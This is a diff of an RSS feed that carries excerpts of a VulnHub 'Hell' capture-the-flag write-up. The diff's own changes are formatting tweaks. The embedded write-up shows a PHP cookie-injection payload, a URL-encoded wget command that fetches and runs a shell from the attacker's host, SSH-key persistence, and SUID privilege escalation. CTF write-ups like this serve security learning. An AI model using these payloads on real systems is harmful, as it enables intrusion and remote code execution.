@@ -1,12 +1,11 @@
 <?xml version="1.0" encoding="utf-8" standalone="yes" ?>
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
   <channel>
-    <title>Hell on rastamouse.me</title>
-    <link>https://rastamouse.me/tags/hell/</link>
-    <description>Recent content in Hell on rastamouse.me</description>
+    <title>hell on rastamouse.me</title>
+    <link>https://rastamouse.me/tags/hell/index.xml</link>
+    <description>Recent content in hell on rastamouse.me</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
-    <lastBuildDate>Tue, 15 Jul 2014 00:00:00 +0000</lastBuildDate>
     <atom:link href="https://rastamouse.me/tags/hell/index.xml" rel="self" type="application/rss+xml" />
     
     <item>
@@ -15,13 +14,13 @@
       <pubDate>Tue, 15 Jul 2014 00:00:00 +0000</pubDate>
       
       <guid>https://rastamouse.me/writeups/2014/hell-1-part-1/</guid>
-      <description>
-
-&lt;p&gt;Hell is the latest installment of evil hosted on VulnHub, and is the devil child of Peleus.  To say it&amp;rsquo;s a difficult and lengthy challenge will not prepare you for the torture&amp;hellip;&lt;/p&gt;
+      <description>&lt;p&gt;Hell is the latest installment of evil hosted on VulnHub, and is the devil child of Peleus.  To say it&amp;rsquo;s a difficult and lengthy challenge will not prepare you for the torture&amp;hellip;&lt;/p&gt;
 
 &lt;p&gt;This VM is designed to try and entertain the more advanced information security enthusiast. This doesn&amp;rsquo;t exclude beginners however and I&amp;rsquo;m sure that a few of you could meet the challenge. There is no &amp;lsquo;one&amp;rsquo; focus on the machine, a range of skills such as web exploitation, password cracking, exploit development, binary examination and most of all logical thinking is required to crack the box in the intended way - but who knows there might be some short cuts!&lt;/p&gt;
 
-&lt;h2 id=&#34;nmap:1f8081f406d4199da2c905fe029d67c9&#34;&gt;Nmap&lt;/h2&gt;
+&lt;p&gt;&lt;/p&gt;
+
+&lt;h2 id=&#34;nmap&#34;&gt;Nmap&lt;/h2&gt;
 
 &lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# nmap -n -p- -A 192.168.127.102
  
@@ -54,7 +53,7 @@ PORT      STATE    SERVICE VERSION
 1 service unrecognized despite returning data.
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;h2 id=&#34;apache:1f8081f406d4199da2c905fe029d67c9&#34;&gt;Apache&lt;/h2&gt;
+&lt;h2 id=&#34;apache&#34;&gt;Apache&lt;/h2&gt;
 
 &lt;p&gt;Popping over to port 80 in a web browser, gives you a page with the following text:&lt;/p&gt;
 
@@ -171,7 +170,7 @@ I wonder what&#39;s on the gateway to hell? (Port 666 obv)
 
 &lt;p&gt;Also, the &lt;code&gt;failcount=;&lt;/code&gt; cookie is unsanitised, so you can modify this to be any value.  Putting all this together, we have some handy php injection!&lt;/p&gt;
 
-&lt;h2 id=&#34;lfi-php-injection:1f8081f406d4199da2c905fe029d67c9&#34;&gt;LFI, PHP Injection&lt;/h2&gt;
+&lt;h2 id=&#34;lfi-php-injection&#34;&gt;LFI, PHP Injection&lt;/h2&gt;
 
 &lt;p&gt;First, I injected the following PHP code into &lt;code&gt;/tmp/note.txt&lt;/code&gt;, via &lt;code&gt;notes.php&lt;/code&gt;:
 &lt;code&gt;&amp;lt;?php passthru($_COOKIE[&#39;failcount&#39;]); ?&amp;gt;&lt;/code&gt;.&lt;/p&gt;
@@ -193,7 +192,7 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 &lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;wget%20http%3A%2F%2F192.168.127.127%2Fshell%20-O%20%2Ftmp%2Fshell%20%26%26%20chmod%20%2Bx%20%2Ftmp%2Fshell%20%26%26%20%2Ftmp%2Fshell
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;h2 id=&#34;jack:1f8081f406d4199da2c905fe029d67c9&#34;&gt;Jack&lt;/h2&gt;
+&lt;h2 id=&#34;jack&#34;&gt;Jack&lt;/h2&gt;
 
 &lt;p&gt;With shell access as &lt;code&gt;www-data&lt;/code&gt;, I was able to read the &lt;code&gt;login.php&lt;/code&gt; file in the &lt;code&gt;super_secret&lt;/code&gt; directory.&lt;/p&gt;
 
@@ -238,7 +237,7 @@ Ok Jack. I&#39;ve created the account &#39;milk_4_life&#39; as per your request.
 The password is &#39;4J0WWvL5nS&#39;
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;h2 id=&#34;milk-4-life:1f8081f406d4199da2c905fe029d67c9&#34;&gt;milk_4_life&lt;/h2&gt;
+&lt;h2 id=&#34;milk-4-life&#34;&gt;milk_4_life&lt;/h2&gt;
 
 &lt;p&gt;With SSH access as milk_4_life, some proper work begins.&lt;/p&gt;
 
@@ -350,7 +349,7 @@ $ id
 uid=1002(milk_4_life) gid=1002(milk_4_life) euid=1000(george) groups=1000(george),1002(milk_4_life)
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;h2 id=&#34;george:1f8081f406d4199da2c905fe029d67c9&#34;&gt;George&lt;/h2&gt;
+&lt;h2 id=&#34;george&#34;&gt;George&lt;/h2&gt;
 
 &lt;p&gt;This allows you to enter George&amp;rsquo;s home directory.  To give myself persistent access, I created a &lt;code&gt;.ssh&lt;/code&gt; directory and echo&amp;rsquo;d my public SSH key into &lt;code&gt;authorized_keys&lt;/code&gt; - this allows me to SSH in as George, without a password.
 George does have an email (which is readable before now), but contains an interesting reference to the &lt;code&gt;rockyou&lt;/code&gt; wordlist.&lt;/p&gt;
@@ -381,8 +380,7 @@ Protect hidden volume (if any)? (y=Yes/n=No) [No]:
  
 george@hell:~$ ls -l /mnt/truecrypt/
 -rwx------ 1 george george 1679 Jul  5 20:01 id_rsa
-&lt;/code&gt;&lt;/pre&gt;
-</description>
+&lt;/code&gt;&lt;/pre&gt;</description>
     </item>
     
     <item>
@@ -391,11 +389,11 @@ george@hell:~$ ls -l /mnt/truecrypt/
       <pubDate>Tue, 15 Jul 2014 00:00:00 +0000</pubDate>
       
       <guid>https://rastamouse.me/writeups/2014/hell-1-part-2/</guid>
-      <description>
-
-&lt;h2 id=&#34;bazza:b7fe5a88214a93180782efcb19cdbc62&#34;&gt;Bazza&lt;/h2&gt;
+      <description>&lt;h2 id=&#34;bazza&#34;&gt;Bazza&lt;/h2&gt;
 
 &lt;p&gt;With this private key, I was able to SSH in as another user, Bazza.  Within his home directory are two binary files with some interesting permissions.&lt;/p&gt;
+
+&lt;p&gt;&lt;/p&gt;
 
 &lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;-r-xr-sr-x 1 oj   developers 6239 Jul  6 18:39 part1
 -r-sr-xr-x 1 oj   oj         5312 Jul  6 18:34 part2
@@ -472,7 +470,7 @@ oj
 
 &lt;p&gt;Now I am OJ (I wish I was as good as OJ)  :)&lt;/p&gt;
 
-&lt;h2 id=&#34;thecolonial:b7fe5a88214a93180782efcb19cdbc62&#34;&gt;TheColonial&lt;/h2&gt;
+&lt;h2 id=&#34;thecolonial&#34;&gt;TheColonial&lt;/h2&gt;
 
 &lt;p&gt;This is the final hurdle, but it&amp;rsquo;s a doosy.  There is a binary, &lt;code&gt;echo&lt;/code&gt; in his home directory, owned by root and has the SUID bit set.&lt;/p&gt;
 
@@ -534,7 +532,7 @@ int main(int argc, char *argv[])
 &lt;p&gt;to be completed&lt;/p&gt;
 &lt;/blockquote&gt;
 
-&lt;h2 id=&#34;flag:b7fe5a88214a93180782efcb19cdbc62&#34;&gt;Flag&lt;/h2&gt;
+&lt;h2 id=&#34;flag&#34;&gt;Flag&lt;/h2&gt;
 
 &lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;Congratulations of beating Hell. 
  
@@ -545,7 +543,7 @@ Hit me up on irc.freenode.net in #vulnhub with your thoughts (Peleus) or follow 
 Flag: a95fc0742092c50579afae5965a9787c54f1c641663def1697f394350d03e5a53420635c54fffc47476980343ab99951018fa6f71f030b9986c8ecbfc3a3d5de
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;h2 id=&#34;shout-outs:b7fe5a88214a93180782efcb19cdbc62&#34;&gt;Shout-outs&lt;/h2&gt;
+&lt;h2 id=&#34;shout-outs&#34;&gt;Shout-outs&lt;/h2&gt;
 
 &lt;p&gt;This was a really tough challenge, and I wouldn&amp;rsquo;t have been able to complete it without the collaboration of the other guys in #VulnHub.  Special thanks go to:&lt;/p&gt;
 
@@ -553,8 +551,7 @@ Flag: a95fc0742092c50579afae5965a9787c54f1c641663def1697f394350d03e5a53420635c54
 &lt;li&gt;recrudesce - it was great fun working alongside you for most of the way;&lt;/li&gt;
 &lt;li&gt;barrebas - for your general pointers and guidance, and;&lt;/li&gt;
 &lt;li&gt;c0ne - for graciously donating your python split code.&lt;/li&gt;
-&lt;/ul&gt;
-</description>
+&lt;/ul&gt;</description>
     </item>
     
   </channel>
